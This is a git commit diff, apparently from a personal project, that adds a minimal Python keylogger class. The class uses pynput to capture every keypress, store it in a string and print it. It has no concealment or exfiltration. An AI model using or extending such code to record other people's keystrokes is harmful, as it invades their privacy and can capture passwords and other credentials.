50c4760bcfade6afab8b7d5209f44ee2ddbb79d3
Chaim Yesha'aye Shteinberg <a0533197133@gmail.com>
2025-02-10 18:09:59 +0200

    key_logger_service_1

--- .venv/KeyLogger.py
+++ .venv/KeyLogger.py
@@ -1,2 +1,19 @@
-class Key_Logger:
-    pass
+from pynput import keyboard
+
+class KeyLogger:
+    def __init__(self):
+        self.logger = ""
+        self.key_logger_service()
+
+
+    def key_logger_service(self):
+        listener = keyboard.Listener(on_press=self.on_press)
+        listener.start()
+
+    def on_press(self, key):
+        try:
+            self.logger += key.char
+            print(key.char)
+        except AttributeError:
+            self.logger += str(key)
+            print(str(key))
